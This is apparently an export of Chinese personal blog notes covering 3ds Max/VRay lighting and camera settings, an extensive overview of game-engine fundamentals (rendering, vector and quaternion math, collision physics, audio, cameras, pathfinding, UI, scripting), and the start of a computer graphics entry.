<li>选项<ul>
<li>不可见</li>
<li>影响漫反射（是否发光）</li>
<li>影响高光</li>
<li>影响反射（反射会出现）</li>
</ul>
</li>
<li>网格灯光<ul>
<li>拾取网格（某个物体）</li>
</ul>
</li>
</ul>
<p>VRay IES 光域网（装饰，补光）<br>参数：</p>
<ul>
<li>IES 文件：灯光类型文件</li>
<li>功率</li>
<li>颜色</li>
</ul>
<p>VRay 太阳<br>参数：</p>
<ul>
<li>倍增</li>
<li>位置：决定灯光颜色</li>
<li>大小倍增：反光影子</li>
<li>阴影细分：消除噪点</li>
</ul>
<h3 id="相机"><a href="#相机" class="headerlink" title="相机"></a>相机</h3><p>标准相机：<br>目标：</p>
<ul>
<li>镜头大小（24）</li>
<li>高度：850-900</li>
<li>剪切平面（进距剪切）</li>
<li>右键 -&gt; 应用摄像机校正修改器</li>
<li>修改器：推测</li>
</ul>
<p>物理相机</p>
<ul>
<li>焦距（24）</li>
<li>快门</li>
<li>曝光：<ul>
<li>曝光增益</li>
</ul>
</li>
<li>白平衡：调整冷暖</li>
<li>启用渐晕（四个角变暗）</li>
<li>景深<ul>
<li>先调整目标点：焦平面</li>
<li>光圈：3</li>
<li>调整范围</li>
</ul>
</li>
<li>运动模糊<ul>
<li>快门速度</li>
</ul>
</li>
</ul>
<h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><h3 id="角色绘制"><a href="#角色绘制" class="headerlink" title="角色绘制"></a>角色绘制</h3><h3 id="角色贴图"><a href="#角色贴图" class="headerlink" title="角色贴图"></a>角色贴图</h3><h3 id="角色动画"><a href="#角色动画" class="headerlink" title="角色动画"></a>角色动画</h3><h4 id="骨骼"><a href="#骨骼" class="headerlink" title="骨骼"></a>骨骼</h4><h4 id="蒙皮"><a href="#蒙皮" class="headerlink" title="蒙皮"></a>蒙皮</h4><h4 id="表情绑定"><a href="#表情绑定" class="headerlink" title="表情绑定"></a>表情绑定</h4><h4 id="毛发"><a href="#毛发" class="headerlink" title="毛发"></a>毛发</h4><h4 id="动力学"><a href="#动力学" class="headerlink" title="动力学"></a>动力学</h4><h2 id="制作流程"><a href="#制作流程" class="headerlink" title="制作流程"></a>制作流程</h2><h3 id="构图"><a href="#构图" class="headerlink" title="构图"></a>构图</h3><h3 id="制作低模"><a href="#制作低模" class="headerlink" title="制作低模"></a>制作低模</h3><p>使用3D Max，Maya等软件。</p>
<h3 id="雕刻低模"><a href="#雕刻低模" class="headerlink" title="雕刻低模"></a>雕刻低模</h3><p>ZBrush</p>
<h3 id="高模拓扑到低模"><a href="#高模拓扑到低模" class="headerlink" title="高模拓扑到低模"></a>高模拓扑到低模</h3><p>Topo Gun<br>ZBrush自带的拓扑工具</p>
<h3 id="展开低模UV"><a href="#展开低模UV" class="headerlink" title="展开低模UV"></a>展开低模UV</h3><p>使用3DMax或Maya，或其他工具。<br>最终烘焙发现贴图。</p>
<h3 id="贴图绘制"><a href="#贴图绘制" class="headerlink" title="贴图绘制"></a>贴图绘制</h3><p>绘制漫反射贴图。</p>
<h2 id="影视效果"><a href="#影视效果" class="headerlink" title="影视效果"></a>影视效果</h2><h3 id="C4D"><a href="#C4D" class="headerlink" title="C4D"></a>C4D</h3><h3 id="MAYA"><a href="#MAYA" class="headerlink" title="MAYA"></a>MAYA</h3><h2 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h2><p>DAZ<br>C4D Python<br>MAYA<br>ZBrush<br>Sketchup</p>
<p>Unity<br>UE4<br>Vulkan</p>
<h2 id="渲染器"><a href="#渲染器" class="headerlink" title="渲染器"></a>渲染器</h2><p>RENDER MAN<br>MENTAL RAY<br>MAXWELL RENDER<br>BRAZIL<br>VRAY<br>FINALRENDER<br>TURTLE<br>CARTOON</p>
]]></content>
      <categories>
        <category>游戏与3D</category>
      </categories>
      <tags>
        <tag>3D</tag>
        <tag>3D MAX</tag>
      </tags>
  </entry>
  <entry>
    <title>游戏开发</title>
    <url>/2021/05/13/%E6%B8%B8%E6%88%8F/GameStart/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="基本架构"><a href="#基本架构" class="headerlink" title="基本架构"></a>基本架构</h1><h2 id="帧"><a href="#帧" class="headerlink" title="帧"></a>帧</h2><ol>
<li>每秒绘制的帧数不固定，需要计算帧与帧之间的间隔时间，以便物理引擎使用。</li>
<li>多线程渲染，显示帧，处理帧，输入帧都不在一个帧上，渲染线程比主线程慢一帧。</li>
<li>渲染游戏对象，游戏对象分为三类：需要渲染和更新的（子弹，人物），只更新的（触发器，摄像机），只渲染的（背景）。游戏对象需要有两个接口，<code>渲染接口</code>，<code>更新接口</code>。</li>
<li>程序维护一个渲染队列，一个更新队列。</li>
</ol>
<h2 id="2D-渲染"><a href="#2D-渲染" class="headerlink" title="2D 渲染"></a>2D 渲染</h2><p>垂直同步：采用双缓冲技术，在场消隐期减缓缓冲区。有时也可以采用三缓冲。</p>
<p>精灵：是使用图片绘制的2D图像，表示一个角色或其他动态对象。载入精灵可以采用库<code>stb_image.c</code>。每个精灵都有一个绘制顺序，采用画家算法绘制；还有图像数据；以及位置数据。</p>
<p>画家算法：先画背景后画角色，即所有精灵按位置排好顺序，按顺序绘制到屏幕上。</p>
<p>动画：定义如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一个动画</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AnimFrameData</span></span></span><br><span class="line"><span class="class">    <span class="title">int</span> <span class="title">startFrame</span>  // 第一帧的动画索引</span></span><br><span class="line"><span class="class">    <span class="title">int</span> <span class="title">numFrames</span>   // 动画总帧数</span></span><br><span class="line"><span class="class"><span class="title">end</span></span></span><br><span class="line"><span class="class">// 一组动画</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AnimData</span></span></span><br><span class="line"><span class="class">    <span class="title">ImageFile</span> <span class="title">images</span>[]        // 所有动画图片</span></span><br><span class="line"><span class="class">    <span class="title">AnimFrameData</span> <span class="title">frameInfo</span>[] // 所有动画用到的帧</span></span><br><span class="line"><span class="class"><span class="title">end</span></span></span><br></pre></td></tr></table></figure>

<p>对于一个角色，定义它的动画可以包括如下属性</p>
<ul>
<li>所有动画数据</li>
<li>当前动画编号</li>
<li>当前动画帧号</li>
<li>动画的播放速度</li>
</ul>
<p>纹理数据应打包传递给GPU，但注意一些设备的最大纹理尺寸是有要求的。</p>
<p>滚屏：</p>
<ul>
<li>单轴滚屏：只能左右滚屏，图片可以切分后按需加载。绘制哪张背景，根据摄像机位置决定。</li>
<li>无限滚屏：连续使用某种图片循环绘制。</li>
<li>平行滚屏：背景分为多层，例如云朵比地面滚动的慢。</li>
<li>四向滚屏：原点放置问题。</li>
</ul>
<p>砖块地图：地图中的每个网格可以存放一个编号，代表一个或多个精灵。通过这些精灵的拼凑来绘制地图。还有一类是斜视等视角砖块地图，例如《暗黑破坏神》。</p>
<h2 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a>线性代数</h2><p>向量：加，减，单位化，点积，叉积。</p>
<p>卡马克快速平方根倒数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">float</span> <span class="title">Qsqrt</span><span class="params">(<span class="type">float</span> number)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">float</span> x2, y;</span><br><span class="line">    x2 = number * <span class="number">0.5F</span>;</span><br><span class="line">    y = number;</span><br><span class="line">    i = *(<span class="type">int</span>*)&amp;y;</span><br><span class="line">    i = <span class="number">0x5F3759DF</span> - (i&gt;&gt;<span class="number">1</span>);</span><br><span class="line">    y = *(<span class="type">float</span>*)&amp;i;</span><br><span class="line">    y = y * (<span class="number">1.5F</span> - x2 * y * y);  <span class="comment">// 牛顿迭代</span></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>向量反射：<br>0. 定义：入射速度<code>V1</code>，出射速度<code>V2</code>，碰撞墙面的单位法向量<code>N</code>。</p>
<ol>
<li>将<code>-V1</code>向<code>N</code>投影得到<code>V0</code></li>
<li>令<code>S=V0+V1</code></li>
<li>则<code>V2=-V1+2S</code></li>
<li>推导得<code>V2=V1-2N*(V1*N)</code></li>
</ol>
<p>平面旋转：<br>0. 定义：当前单位方向<code>C</code>，目标单位方向<code>N</code>。</p>
<ol>
<li>计算两向量夹角<code>arccos(C, N)</code>。</li>
<li>向量增广为三维，计算旋转方向<code>cross(C, N)</code>，若为正，逆时针转；若为负，顺时针转。</li>
</ol>
<p>线性插值：<code>Lerp(a, b, f) = (1-f) * a + f * b</code></p>
<p>坐标系：DirectX默认为左手系，OpenGL默认为右手系。</p>
<p>矩阵：加，减，数乘，矩阵乘积，求逆，转置。</p>
<p>矩阵表示3D变换：OpenGL用列向量表示位置，其他引擎用行向量表示位置。</p>
<h2 id="3D"><a href="#3D" class="headerlink" title="3D"></a>3D</h2><p>模型：由基本的三角形面构成。单个模型称为网络，一般一个角色模型可能由一万多个多边形构成，一个木桶模型可能由几百个多边形构成。</p>
<p>坐标系：</p>
<ol>
<li>模型坐标系：原点通常在模型中央，或角色两脚中间。</li>
<li>世界坐标系：所有对象都相对于世界原点偏移。</li>
<li>摄像机坐标系：需要定义左方、上方、前方、位置4个向量。最终世界坐标将映射到摄像机视野中。</li>
<li>投影坐标系：分为正交投影和透视投影。一般采用透视投影。需要定义视角，近平面，远平面。</li>
</ol>
<p>齐次坐标系：使用4维向量表示3维坐标，4维矩阵可以用乘法方式表示平移变换。（3维矩阵乘法只能表示旋转和缩放）</p>
<p>矩阵变换：平移、旋转、缩放。</p>
<p>变换矩阵 &#x3D; 缩放 x 旋转 x 平移</p>
<p>缩放：<br>$$<br>    \begin{bmatrix}<br>    {s_{x}}&amp;{0}&amp;{0}&amp;{0}\<br>    {0}&amp;{s_{y}}&amp;{0}&amp;{0}\<br>    {0}&amp;{0}&amp;{s_{z}}&amp;{0}\<br>    {0}&amp;{0}&amp;{0}&amp;{1}\<br>    \end{bmatrix}<br>$$</p>
<p>平移：<br>$$<br>    \begin{bmatrix}<br>    {1}&amp;{0}&amp;{0}&amp;{0}\<br>    {0}&amp;{1}&amp;{0}&amp;{0}\<br>    {0}&amp;{0}&amp;{1}&amp;{0}\<br>    {t_{x}}&amp;{t_{y}}&amp;{t_{z}}&amp;{1}\<br>    \end{bmatrix}<br>$$</p>
<p>X轴旋转：<br>$$<br>    \begin{bmatrix}<br>    {1}&amp;{0}&amp;{0}&amp;{0}\<br>    {0}&amp;{cos(\theta)}&amp;{-sin(\theta)}&amp;{0}\<br>    {0}&amp;{sin(\theta)}&amp;{cos(\theta)}&amp;{0}\<br>    {0}&amp;{0}&amp;{0}&amp;{1}\<br>    \end{bmatrix}<br>$$</p>
<p>Y轴旋转：<br>$$<br>    \begin{bmatrix}<br>    {cos(\theta)}&amp;{0}&amp;{sin(\theta)}&amp;{0}\<br>    {0}&amp;{1}&amp;{0}&amp;{0}\<br>    {-sin(\theta)}&amp;{0}&amp;{cos(\theta)}&amp;{0}\<br>    {0}&amp;{0}&amp;{0}&amp;{1}\<br>    \end{bmatrix}<br>$$</p>
<p>Z轴旋转：<br>$$<br>    \begin{bmatrix}<br>    {cos(\theta)}&amp;{-sin(\theta)}&amp;{0}&amp;{0}\<br>    {sin(\theta)}&amp;{cos(\theta)}&amp;{0}&amp;{0}\<br>    {0}&amp;{0}&amp;{1}&amp;{0}\<br>    {0}&amp;{0}&amp;{0}&amp;{1}\<br>    \end{bmatrix}<br>$$</p>
<p>颜色：由RGBA四个通道构成。可以附着在顶点上。</p>
<p>顶点：包括位置、颜色、法线、纹理映射坐标(UV)等属性。</p>
<p>光照：</p>
<ul>
<li>环境光：没有光源，充满整个空间</li>
<li>方向光：例如太阳光</li>
<li>点光源：可以使用衰减半径</li>
<li>聚光灯：方向固定</li>
</ul>
<p>光照模型( BRDF 反射分布函数 )：</p>
<ul>
<li>Phong 光照模型：环境光、漫反射、高光。不考虑光的二次反射。</li>
</ul>
<p>着色：</p>
<ul>
<li>平面着色：三角形只使用一种颜色着色。</li>
<li>Gouraud 着色：为3个顶点着色，中间部分通过插值着色。</li>
<li>Phong 着色：利用<code>顶点法线</code>与<code>光源方向</code>计算着色的强度着色，中间部分对法线插值着色。</li>
</ul>
<p>深度缓冲：仅在渲染过程中使用，计算每个像素到摄像机的距离。当新的像素距离更近时，更新深度缓冲，同时绘制像素。绘制透明物体时，需关闭深度缓冲的写功能，当透明像素距离超过缓冲区值时，不绘制该像素，当透明像素距离小于缓冲区值时，叠加绘制该像素。该方法无需排序对象。</p>
<p>帧缓冲区：每帧都要用。</p>
<ol>
<li>深度缓冲：一般采用24位或32位。</li>
<li>颜色缓冲</li>
<li>模板缓冲</li>
</ol>
<p>欧拉角：会产生方向锁。</p>
<p>四元数：可以任意旋转。</p>
<ul>
<li>线性插值</li>
<li>球形插值</li>
</ul>
<p>标准四元数：长度为<code>1</code>，写作 </p>
<p>$q &#x3D; [ {q_v}, {q_s} ]$ </p>
<p>其中 </p>
<p>${q_v} &#x3D; a sin({\theta} &#x2F; 2 )$  </p>
<p>${q_s} &#x3D; cos({\theta} &#x2F; 2)$</p>
<p>a 表示旋转轴， ${\theta}$表示旋转角度</p>
<p>Grassmann积：</p>
<p>(pq)v &#x3D; ps * qv + qs * pv + pv x qv</p>
<p>(pq)s &#x3D; ps * qs - pv * qv</p>
<p>共轭四元数：将向量分量取逆即可。</p>
<p>单位四元数：iv &#x3D; (0, 0, 0), is &#x3D; 1</p>
<p>3D对象的表示：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GameObejct3D</span> &#123;</span><br><span class="line">    Quaternion rotation;</span><br><span class="line">    Vector3 position;</span><br><span class="line">    <span class="type">float</span> scale;</span><br><span class="line">    <span class="function">Matrix <span class="title">GetWorldTransform</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 必须 先缩放 后旋转 再平移</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">CreateScale</span>(scale) </span><br><span class="line">                * <span class="built_in">CreateFromQuaternion</span>(rotation) </span><br><span class="line">                * <span class="built_in">CreateTranslation</span>(position);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Quaternion</span> &#123;</span><br><span class="line">    Vector3 qv;</span><br><span class="line">    <span class="type">float</span> qs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="输入设备"><a href="#输入设备" class="headerlink" title="输入设备"></a>输入设备</h2><p>按键类型：模拟输入、数字输入、同时按键、序列按键。</p>
<p>使用跨平台库解决设备输入问题。<a href="https://www.libsdl.org/">SDL</a></p>
<p>处理按键输入：</p>
<ul>
<li>释放 -&gt; 释放：未按</li>
<li>释放 -&gt; 按下：按下</li>
<li>按下 -&gt; 释放：松开</li>
<li>按下 -&gt; 按下：一直按着</li>
</ul>
<p>处理模拟输入：</p>
<ul>
<li>需要对模拟量滤波处理，例如在摇杆中心位置附近设置无效区。</li>
</ul>
<p>基于事件的输入：</p>
<ul>
<li>采用订阅、发布模型<ul>
<li>发布者持续关注按键变化，并通知有关的订阅者</li>
<li>订阅者关注感兴趣的按键变化</li>
</ul>
</li>
</ul>
<p>按键映射：游戏可以将角色动作和按键定义分离开，例如游戏中绑定<code>Fire</code>，<code>Hide</code>等虚拟按键，再在这些按键上绑定真实按键。</p>
<p>移动设备输入：</p>
<ul>
<li>触屏与手势：<ul>
<li>模拟摇杆</li>
<li>手势操作：例如两指缩放。检测方法：Rubine算法。</li>
</ul>
</li>
<li>加速计与陀螺仪</li>
</ul>
<h2 id="声音"><a href="#声音" class="headerlink" title="声音"></a>声音</h2><p>播放声音的频道有限，因此需要尽可能利用所有频道播放声音。此外，还需要给音频设置优先级，在频道不够用的时候优先播放优先级高的音频。</p>
<p>音频格式：</p>
<ul>
<li>wav：无压缩，适合短音频。</li>
<li>ogg&#x2F;mp3：压缩音频，适合长音频。</li>
</ul>
<p>音频解决方案：<a href="https://kcat.strangesoft.net/openal.html">OpenAL</a></p>
<p>声音事件：将音频与元数据打包二成。例如，爆炸音效，可以包含多个爆炸音频，当使用时，可以随机选择其中一个音频播放，同时还可以指定音频优先级，渐入渐出效果；脚步音效，可以根据地面材质选择脚步的效果（草地，雪地，石头）。</p>
<p>3D声音：需要考虑音源与监听者的相对位置。监听者的位置一般使用摄像机作为监听者，或摄像机与角色之间33%-66%的位置，朝向与摄像机一致。</p>
<p>衰减：声音随着距离线性分贝衰减。常用方法有线性分贝衰减函数等。</p>
<p>环绕声：例如5.1环绕系统或7.1环绕系统。</p>
<p>数字信号处理：可以用来做声音特效，如回声，闷音，可以采用预设特效。</p>
<p>预设音频特效：</p>
<ul>
<li>回声：<a href="https://freeberb3.sourceforge.net/">Freeverb3</a></li>
<li>音高偏移：例如多普勒效果。</li>
<li>低通滤波器：蜂鸣声。</li>
<li>声音遮挡：高音部分被遮挡，低音部分穿透障碍物。降低高频部分的声音。</li>
<li>声音衍射：声音经过柱子衍射成多个波源，监听者可能会听到两次声音。</li>
<li>声学衍射：Fresnel声学衍射，在监听者附近构建一个圆弧，发射者向圆弧射去一系列直线，判断中间是否有遮挡，或部分遮挡。</li>
</ul>
<p>区域标记：指定特效声音生效的区域。例如回声特效只能在山洞中生效。一般采用凸多边形。进入该区域时，回声特效渐变出现。</p>
<h2 id="物理"><a href="#物理" class="headerlink" title="物理"></a>物理</h2><p>平面：表达式 <code>P * n + d = 0</code>。P为任意一点，n为法向量。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Plane</span> &#123;</span><br><span class="line">    Vector3 normal;</span><br><span class="line">    <span class="type">float</span> d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>射线与线段：表达式 <code>R(t) = R0 + v * t</code>。v为法向量。t的取值范围决定线的类型。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">RayCast</span> &#123;</span><br><span class="line">    Vector3 startPoint;</span><br><span class="line">    Vector3 endPoint;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>碰撞集合体：检测碰撞通常采用简单的集合体碰撞检测，例如球体，方盒，圆柱，胶囊体。此外，一个物体可以有多个级别的碰撞体，以便简化计算。根据不同的场合，也可以选择不同的碰撞检测体，例如判断子弹入射，可以使用高精度的组合几何体碰撞检测，判断是否与建筑碰撞，采用胶囊体即可。</p>
<p>包围球：精度较低，适合初级碰撞检测。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">BoundingSphere</span>&#123;</span><br><span class="line">    Vector3 center</span><br><span class="line">    <span class="type">float</span> radius</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>轴对齐包围盒：保存包围盒的左上角和右下角坐标，通常用于角色。也适合初级碰撞检测。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">AABB2D</span>&#123;</span><br><span class="line">    Vector2 min</span><br><span class="line">    Vector2 max</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>朝向包围盒：表示方法众多，可以参考<code>Real-time Collision Detection</code>。</p>
<p>胶囊体：圆柱加两个半球。常用于角色。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Capsule</span>&#123;</span><br><span class="line">    Vector3 startPoint</span><br><span class="line">    Vector3 endPoint</span><br><span class="line">    <span class="type">float</span> radius</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>凸多边形：效率很低。</p>
<p>当前帧碰撞检测：</p>
<ul>
<li>球与球的交叉：采用距离与半径之和。</li>
<li>AABB与AABB交叉</li>
<li>线段与平面的交叉：如果不平行，则解方程组看交点。<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">R(t) * n + d = <span class="number">0</span></span><br><span class="line">(R0 + v * t) * n + d = <span class="number">0</span></span><br></pre></td></tr></table></figure></li>
<li>线段与三角面的交叉：除了与平面交叉的要素之外，还应考虑交点是否在三角形内。判断方法，采用三角形AB、AC、BC叉乘AP、BP、CP的方式。</li>
<li>球与平面交叉：过球心做与目标平面平行的平面，测量两平面距离与球半径。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SpherePlaneIntersection</span><span class="params">(BoundingSphere s, Plane p)</span> </span>&#123;</span><br><span class="line">    <span class="type">float</span> ds = - <span class="built_in">DotProduct</span>(p.normal, s.center);</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">abs</span>(d - ds) &lt; s.radius)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>后续帧碰撞检测：某些高速运动的物体可能会直接穿过碰撞体，跳过碰撞发生的帧。如子弹穿过纸。因此需要用一种连续性的方法检测碰撞。</p>
<ul>
<li>球形扫掠体检测：用来判断两帧之间是否有碰撞发生。将上一帧与当前帧的子弹位置构成一个胶囊体，然后判断与另一个胶囊体或平面是否碰撞。求解思路：将两个胶囊体构造成参数方程，求解两个参数方程当<code>RA + RB == ||P(t) - Q(t)||</code>时，t的根的情况。</li>
</ul>
<p>响应碰撞：当碰撞发生后，碰撞的游戏对象做出的响应。</p>
<ul>
<li>碰撞后消失</li>
<li>碰撞后减少生命值</li>
<li>碰撞后弹开</li>
</ul>
<p>两个球体碰撞后弹开：需要考虑碰撞切面，碰撞后的速度，碰撞的时刻（防止粘到一起）。求解思路：求解碰撞切面，用两球心的连线做切面的法线即可；求解碰撞点，根据两球半径在两球心连线上插值得到；求解碰撞后的速度，速度大小可以考虑弹性碰撞和非弹性碰撞，速度方向。</p>
<p>优化碰撞：采用八叉树的方式，每次剔除与玩家不产生碰撞的一半的空间，剔除过程还可以采用启发式搜索进行。</p>
<p>基于物理的移动：采用经典力学</p>
<ul>
<li>线性力学</li>
<li>角力学</li>
</ul>
<p>基于时间的积分：需要防止因为帧率变低导致的积分结果变大的问题。</p>
<p>力的计算：力一直作用在物体上，有时需要用冲量来代替力，即<code>力 x 帧数</code>。例如跳跃时，先给角色一个帧的冲量起跳，到空中再计算加速度让角色回落到地面。</p>
<p>欧拉积分：新的位置由旧的位置加上旧的速度与时间的积得到。该算法的问题是，速度一直采用旧的速度，会产生累计误差。</p>
<p>半隐式欧拉积分：新的位置由旧的位置加上新的速度与时间的积得到。在Box2D中就是这一算法。</p>
<p>Verlet积分法：相比于前两者，该方法采用平均速度代替其他的速度进行积分。</p>
<p>四阶Runge-Kutta方法：采用泰勒近似求解的结果表示近似解，通常用于模拟汽车。</p>
<p>角力学：转动惯量、力矩、角加速度、角速度、速度等。</p>
<p>物理中间件：</p>
<ul>
<li>Havok：一个商业物理引擎</li>
<li>PhysX：工业级物理引擎，小制作免费，收入高时收费。</li>
<li>Box2D：2D游戏的物理引擎，例如<code>愤怒的小鸟</code>就在用。</li>
</ul>
<h2 id="摄像机"><a href="#摄像机" class="headerlink" title="摄像机"></a>摄像机</h2><p>透视投影：</p>
<ul>
<li>视场：看到的场景的广度，又称FOV。人的眼睛可以看到180°的范围，但是超过120°的范围一般是模糊不清的，只能察觉到运动物体。视场的大小和用户与屏幕的距离有关，一般屏幕占用户多大视角，就采用多大的视场。在PC中，可以采用90°的视场，不宜太大，会产生鱼眼效果。</li>
</ul>
<p>宽高比：4:3、16:9、16:10等。</p>
<p>固定摄像机：根据玩家位置判断使用几号摄像机，如《生化危机1》。有些固定摄像机也可以小范围移动，例如在《战神》中的摄像机。</p>
<p>第一人称摄像机：放在眼睛位置，但是为了看见手臂，会同时调整手臂和腿的位置（这些位置可能并不合理）。但是在考虑阴影时，或其他人视角时，又采用正常的模型。</p>
<p>场景摄像机：利用样条线制作摄像机运动轨迹，达到电影级别的运镜效果。</p>
<p>跟随摄像机：</p>
<ul>
<li>基础跟随摄像机：总是在物体后面保持一定距离，始终指向被观察物体。</li>
<li>弹性跟随摄像机：与被观察物体的距离根据情况随时平滑调整。</li>
<li>旋转摄像机：可以围绕被观察物体运动。控制模式可以采用增量偏航、增量俯仰，距离等参数，但是不使用横滚。</li>
<li>第一人称摄像机：放在角色相对的位置上，采用绝对偏航，绝对俯仰记录摄像机角度。</li>
<li>样条摄像机：利用<code>Catmull-Rom</code>样条线，实现摄像机的运动。样条线的切线表示了摄像机的朝向。</li>
</ul>
<p>摄像机碰撞：</p>
<ul>
<li>从目标射出一条射线到摄像机，判断二者之间是否存在不透明物体。</li>
<li>或给摄像机设置碰撞模型。</li>
<li>距离被观察物体太近时，可以考虑让被观察物体消失。</li>
</ul>
<p>拣选：使用鼠标选中屏幕中的物体。可以利用反投影，从摄像机的近平面某个坐标射出一条射线射向远平面同一个坐标，选中第一个交叉的物体。</p>
<h2 id="人工智能"><a href="#人工智能" class="headerlink" title="人工智能"></a>人工智能</h2><p>游戏AI通常采用状态机或脚本的方式实现，而传统的AI算法更注重广泛存在的问题，例如寻路、决策树等算法。</p>
<p>寻路：</p>
<ul>
<li>搜索空间的表示：一般采用图实现。可以将游戏世界用方格划分成网格，然后基于网格实现寻路。或使用路点划分。<ul>
<li>寻路节点：只能沿着各个节点移动。</li>
<li>导航网格：可以在划定的多边形区域内运动。当然，对于不同的游戏对象，可以使用不同的导航网格。例如小鸡和牛，狭小的地方牛去不了，但是小鸡可以去。</li>
</ul>
</li>
<li>启发式算法：令h(x)为曼哈顿距离或欧式距离，根据h(x)进行启发式搜索。</li>
<li>贪心算法：每次只选择当前最优的走法，不做长远考虑。</li>
<li>A*算法：除了考虑于目标的距离h(x)外，还考虑已经寻路的开销g(x)。</li>
<li>Dijkstra算法：令h(x)&#x3D;0，只保留g(x)进行搜索。该方法适用于同时有多个目标，选最近的目标的情况。</li>
</ul>
<p>状态机：</p>
<ul>
<li>有限状态机：定义状态，以及状态切换的条件。</li>
<li>状态机的设计模式：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基类，具体的状态需要继承该类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AIState</span> &#123;  </span><br><span class="line">    AIController parent;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Update</span><span class="params">(<span class="type">float</span> deltaTime)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Enter</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Exit</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AIController</span>&#123;</span><br><span class="line">    AIState state;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Update</span><span class="params">(<span class="type">float</span> deltaTime)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">SetState</span><span class="params">(AIState newState)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AIController::Update</span><span class="params">(<span class="type">float</span> deltaTime)</span></span>&#123;</span><br><span class="line">    state.<span class="built_in">Update</span>(deltaTime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AIController::SetState</span><span class="params">(AIState newState)</span></span>&#123;</span><br><span class="line">    state.<span class="built_in">Exit</span>();</span><br><span class="line">    state = newState;</span><br><span class="line">    state.<span class="built_in">Enter</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>策略于计划：AI需要有宏观的、长远的目标，然后为达到目标尽力而为。一般在RTS游戏中较为常见。</p>
<ul>
<li>策略：微观策略由单位行动构成，采用状态机算法即可；宏观策略则更为复杂，例如可以采用优先级方式选择当前目标，同时兼顾重要于不重要的事情。</li>
<li>计划：为达成目标采取的一系列行动。由于计划可能会失败，AI需要根据情况调整计划。</li>
</ul>
<h2 id="UI"><a href="#UI" class="headerlink" title="UI"></a>UI</h2><p>菜单栈：菜单的构成是一颗树，进入子级菜单时父级菜单要入栈。</p>
<p>菜单按钮：可以点选，也可以使用上下左右选择。可以采用2D包围盒包围一个按钮，检测用户是否点击。</p>
<p>HUD元素：在游戏场景中，显示玩家生命值等信息。</p>
<p>准心：利用反投影，用屏幕中心的准心拣选目标。</p>
<p>雷达：只需遍历游戏对象，并显示在2D屏幕上即可。</p>
<p>多套分辨率支持：使用相对坐标定义UI元素位置。</p>
<p>本地化：使用外部文件定义显示的文本。</p>
<p>UI中间件：Autodesk ScaleForm。</p>
<h2 id="脚本系统"><a href="#脚本系统" class="headerlink" title="脚本系统"></a>脚本系统</h2><p>可以将摄像机、AI行为、UI界面分开，使用脚本开发。</p>
<p>脚本语言的类型：</p>
<ul>
<li>Lua：轻量级解释器(150KB)，且容易调用C&#x2F;C++。</li>
<li>Python</li>
<li>UnrealScript：编译型脚本语言，也可以调用C&#x2F;C++。还可以使用可视化脚本系统Kismet。</li>
<li>QuakeC</li>
</ul>
]]></content>
      <categories>
        <category>游戏与3D</category>
      </categories>
  </entry>
  <entry>
    <title>计算机图形学</title>
    <url>/2020/02/26/%E6%B8%B8%E6%88%8F/GraphTheory/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>渲染流水线：渲染管线，决定给定模式和纹理，生成二维图形。</p>
